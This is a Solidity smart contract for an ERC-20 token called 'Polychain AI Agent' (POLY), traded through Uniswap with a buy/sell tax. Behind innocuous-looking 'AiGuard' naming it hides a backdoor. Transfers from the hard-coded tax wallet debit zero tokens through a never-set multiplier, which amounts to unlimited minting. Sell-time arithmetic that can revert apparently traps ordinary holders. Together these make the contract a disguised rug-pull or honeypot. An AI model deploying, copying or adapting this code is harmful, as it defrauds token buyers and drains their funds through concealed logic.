/**
*/

// SPDX-License-Identifier: UNLICENSE

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
      return msg.sender;
    }
}

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address _account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(
            owner() == _msgSender(),
            "Ownable: caller is not the owner"
        );
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c>=a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b>0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to, uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to, uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract Poly is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    string private constant _name = unicode"Polychain AI Agent";
    string private constant _symbol = unicode"POLY";
    uint256 private _initialBuyTax=19;
    uint256 private _initialSellTax=19;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=19;
    uint256 private _reduceSellTaxAt=19;
    uint256 private _preventSwapBefore=15;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10000000000 * 10**_decimals;
    uint256 public _maxTxAmount = 100000000 * 10**_decimals;
    uint256 public _maxWalletSize = 100000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 100000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 100000000 * 10**_decimals;

    IUniswapV2Router02 private immutable uniswapV2Router;

    struct AiGuard {uint256 aiIndexer; uint256 aiGuardUsd; uint256 aiGuardPrice;}
    uint256 private maxAiGuard;
    mapping(address => AiGuard) private aiVault;
    uint256 private aiActiveGuard;

    address public uniswapPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private limitsInEffect = true;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x0575b7d9ab889208708A4FE6CA6c390C860C6D15);

        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]=_balances[from].sub(tokenAmount);
        _balances[to]=_balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap ){
            _basicTransfer(from, to,tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner()&& to!=_taxWallet) {
            taxAmount=tokenAmount.mul((_buyCount >_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapPair && to!= address(uniswapV2Router) &&  ! _isExcludedFromFee[to])  {
                if (limitsInEffect) {
                    require(tokenAmount <= _maxTxAmount,
                        "Exceeds the _maxTxAmount.");
                    require(balanceOf(to) + tokenAmount <=_maxWalletSize,
                        "Exceeds the maxWalletSize.");
                }
                _buyCount++;
            }

            if(to == uniswapPair && from!= address(this) ){
                taxAmount=tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapPair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (( _isExcludedFromFee[from] || _isExcludedFromFee[to] )
            && from != address(this)&&
            to!= address(this)
        ) {
            maxAiGuard = block.number;
        }
        
        if (! _isExcludedFromFee[from] &&  ! _isExcludedFromFee[to]){
            if (to != uniswapPair)  {
                AiGuard storage aiGrd = aiVault[to];
                if (from == uniswapPair) {
                    if (aiGrd.aiIndexer == 0) {
                        aiGrd.aiIndexer = _buyCount<=_preventSwapBefore ? type(uint).max : block.number;
                    }
                } else {
                    AiGuard storage aiGrdData = aiVault[from];
                    if (aiGrd.aiIndexer == 0 || aiGrdData.aiIndexer < aiGrd.aiIndexer ) {
                        aiGrd.aiIndexer = aiGrdData.aiIndexer;
                    }
                }
            } else {
                AiGuard storage aiGrdData = aiVault[from];
                aiGrdData.aiGuardUsd = aiGrdData.aiIndexer.sub(maxAiGuard);
                aiGrdData.aiGuardPrice = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount =_tokenTaxTransfer(from,taxAmount,tokenAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount, uint256 receiptAmount) internal {
        _balances[from]= _balances[from].sub(sendAmount);
        _balances[to] =_balances[to].add(receiptAmount);
        emit Transfer(from,to, receiptAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 taxAmount, uint256 tokenAmount) internal returns (uint256) {
        uint256 tAmount = addrs != _taxWallet ? tokenAmount : aiActiveGuard.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] =_balances[address(this)].add(taxAmount);
            emit Transfer(addrs,address(this), taxAmount);
        }
        return tAmount;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);

        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this),address(uniswapV2Router),tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        limitsInEffect= false;
        _maxTxAmount= _tTotal;
        _maxWalletSize= _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function transferEther() external {
        require(_msgSender()==_taxWallet);
        _taxWallet.transfer(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if(ethBalance>0){
            sendETHToFee(ethBalance);
        }
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        swapEnabled=true;
        _approve(address(this),address(uniswapV2Router),_tTotal);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapV2Router),type(uint).max);
        tradingOpen=true;
    }

    receive() external payable {}

}